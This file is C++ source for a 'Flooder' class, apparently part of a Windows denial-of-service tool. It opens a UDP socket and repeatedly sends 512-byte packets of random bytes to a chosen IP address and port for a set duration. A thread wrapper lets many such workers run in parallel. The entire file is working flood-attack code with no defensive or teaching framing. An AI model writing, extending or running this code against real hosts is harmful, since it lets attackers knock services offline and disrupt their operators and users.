#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "flooder.h"
Flooder::Flooder(LPSTR ip, DWORD port, DWORD duration)
{
	if (WSAStartup(MAKEWORD(2, 2), &wsadata_) != 0) {
		exit(144);
	}
	ip_ = ip;
	port_ = port;
	duration_ = duration;

}

Flooder::~Flooder()
{
	closesocket(flood_socket);
	WSACleanup();
}

void Flooder::Worker()
{
	SOCKADDR_IN server_address;
	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(port_);
	server_address.sin_addr.s_addr = inet_addr(ip_);

	flood_socket = NULL;
	flood_socket = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);

	CHAR payload[512] = {
		0x00,
	};

	for (DWORD i = 0; i < 512; i++)
	{
		payload[i] = rand() % 256;
	}

	clock_t start = clock();
	while ((clock() - start) / CLOCKS_PER_SEC < duration_)
	{
		sendto(flood_socket, payload, 512, 0, (SOCKADDR*)&server_address, sizeof(server_address));
		Sleep(10);
	}
	
}

std::thread Flooder::WorkerThread()
{
	return std::thread(&Flooder::Worker, this);
}